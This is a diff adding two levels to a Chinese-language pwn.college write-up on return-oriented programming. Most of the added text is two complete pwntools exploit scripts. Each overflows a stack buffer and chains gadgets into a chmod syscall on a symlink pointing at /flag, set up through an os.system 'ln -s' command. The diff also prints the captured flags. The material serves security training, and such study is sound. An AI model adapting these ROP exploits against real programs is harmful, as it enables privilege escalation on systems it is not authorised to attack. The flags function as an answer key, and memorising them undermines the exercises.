@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-19 17:28"
+modDate: "2025-01-20 15:22"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -30,7 +30,7 @@ slug: "return-oriented-programming"
 
 ### Write-up
 
-带着感慨和某种说不清的复杂的心情步入本章的第一题……
+怀着感慨和某种说不清的复杂的心情步入本章的第一题……
 
 ```c del={5, 34} collapse={1-1, 9-30, 38-40}
 int __fastcall challenge(int a1, __int64 a2, __int64 a3)
@@ -890,3 +890,290 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{o7dF6gbwKmwO-Xrdr1WGG5iKIQ-.0lN0MDL5cTNxgzW}`
+
+## Level 4.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Leverage a stack leak while crafting a ROP chain to obtain the flag!
+
+### Write-up
+
+这题就是自由 ROP 自由日了，感觉还是用 `chmod` 最简单，问题在于如何传递第一个参数 `const char *filename`。
+
+嗯……自己构造 `/flag` 或者别的字符串未免也太麻烦了点，我们直接让 IDA 老婆看看程序本身有没有什么现成的好东西是我们可以直接利用的：
+
+<a href="https://cdn.jsdelivr.net/gh/CuB3y0nd/IMAGES@master/assets/Shot-2025-01-20-130942.png" data-fancybox data-caption>
+  <img src="https://cdn.jsdelivr.net/gh/CuB3y0nd/IMAGES@master/assets/Shot-2025-01-20-130942.png" />
+</a>
+
+像这个 `ret` 看上去就很~清秀~了，我很喜欢～
+
+说实话我感觉自己可能跑偏了，据说这题可以自己构造字符串，但是我太笨了没想出来……但是，你就说我这个方法是不是更简单吧 LMAO
+
+我日，为什么今天都 1.20 了，寒假过的真快，结束前能不能打完 FmtStr 都不好说了……
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level4.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *challenge+396
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    rop = ROP(elf)
+
+    padding_to_ret = b"".ljust(0x48, b"A")
+
+    filename = next(elf.search(b"ret"))
+    mode = 0o4
+    SYS_chmod = 0x5A
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
+    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
+    syscall = rop.find_gadget(["syscall"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_ret),
+        p64(mode),
+        p64(pop_rax_ret),
+        p64(SYS_chmod),
+        p64(syscall),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag ret")
+
+        send_payload(target, payload)
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as file:
+                content = file.read()
+                log.success(content)
+
+                return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload()
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{EXzWCvmQZIa9w6wrK_nx0PK1w3_.01N0MDL5cTNxgzW}`
+
+## Level 4.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Leverage a stack leak while crafting a ROP chain to obtain the flag!
+
+### Write-up
+
+参见 [Level 4.0](#level-40)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level4.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    rop = ROP(elf)
+
+    padding_to_ret = b"".ljust(0x78, b"A")
+
+    filename = next(elf.search(b"###"))
+    mode = 0o4
+    SYS_chmod = 0x5A
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
+    pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
+    syscall = rop.find_gadget(["syscall"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_ret),
+        p64(mode),
+        p64(pop_rax_ret),
+        p64(SYS_chmod),
+        p64(syscall),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag '###'")
+
+        send_payload(target, payload)
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as file:
+                content = file.read()
+                log.success(content)
+
+                return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload()
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{g2fR-zCK75_60foo4wveIENcvF0.0FO0MDL5cTNxgzW}`
